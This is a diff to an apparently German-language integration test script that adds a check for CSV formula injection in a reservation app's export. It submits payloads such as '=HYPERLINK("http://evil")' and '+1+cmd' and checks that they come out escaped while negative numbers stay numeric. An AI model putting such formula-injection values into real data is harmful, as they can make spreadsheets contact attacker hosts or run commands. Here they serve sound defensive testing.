@@ -368,6 +368,22 @@ try:
           st == 200 and st404 == 404
           and not any(c["name"] == "Insel-01" for c in di2["clusters"]))
 
+    print("== Sicherheit: CSV-Formel-Injection ==")
+    req("POST", "/api/reservations",
+        {"name": "=HYPERLINK(\"http://evil\")", "cluster": "Cluster-01",
+         "change": "+1+cmd", "vcpu": 1, "ram_gb": 1, "storage_gb": 1})
+    import csv as _c, io as _io
+    st, rcsv, _ = req("GET", "/api/v1/reservations?format=csv", raw=True)
+    rws = list(_c.reader(_io.StringIO(rcsv.decode()), delimiter=";"))
+    evil = next((r for r in rws if any("HYPERLINK" in c for c in r)), None)
+    check("Formel-Felder in CSV neutralisiert",
+          evil and evil[1].startswith("'=") and evil[2].startswith("'+"))
+    st, dcsv, _ = req("GET", "/api/v1/data?format=csv", raw=True)
+    negs = [c for r in _c.reader(_io.StringIO(dcsv.decode()), delimiter=";")
+            for c in r if c.startswith("-") and c[1:2].isdigit()]
+    check("Negative Zahlen bleiben rechenbar (kein Apostroph)",
+          all(not c.startswith("'") for c in negs))
+
     print("== Kapa-CSV-Import (XLS-Ablösung) ==")
     today = time.strftime("%d.%m.%Y")
     csvtxt = ("﻿Kapa-Nummer;Projekt;Cluster;CPU;RAM;Storage;Datum;Team\n"
